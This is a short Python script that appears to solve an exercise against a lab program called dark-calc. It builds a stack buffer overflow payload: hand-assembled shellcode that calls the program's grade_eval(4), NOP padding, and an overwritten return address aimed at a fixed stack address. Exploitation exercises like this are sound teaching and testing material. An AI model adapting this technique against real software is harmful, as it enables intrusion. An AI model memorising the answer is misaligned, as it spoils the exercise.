#!/usr/bin/env python3
"""Task 3: stack execution in attack/dark-calc.

Overwrite input()'s return address with the address of the expression
buffer, which contains shellcode that calls grade_eval(4).
"""
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


# mov edi, 4              ; grade_eval's argument
# mov eax, 0x401a87       ; grade_eval
# call rax
SHELLCODE = bytes.fromhex(
    "bf 04 00 00 00"
    "b8 87 1a 40 00"
    "ff d0"
)

# input()'s expression[16] is at rbp-0x10. dark-calc maps its stack at a
# fixed address via init_fixed_stack, so this address is stable.
STACK_BUF = 0x721000800FD0

payload = SHELLCODE + b"\x90" * (16 - len(SHELLCODE))
payload += b"B" * 8          # saved rbp
payload += p64(STACK_BUF)    # overwrite input()'s return address

sys.stdout.buffer.write(payload)
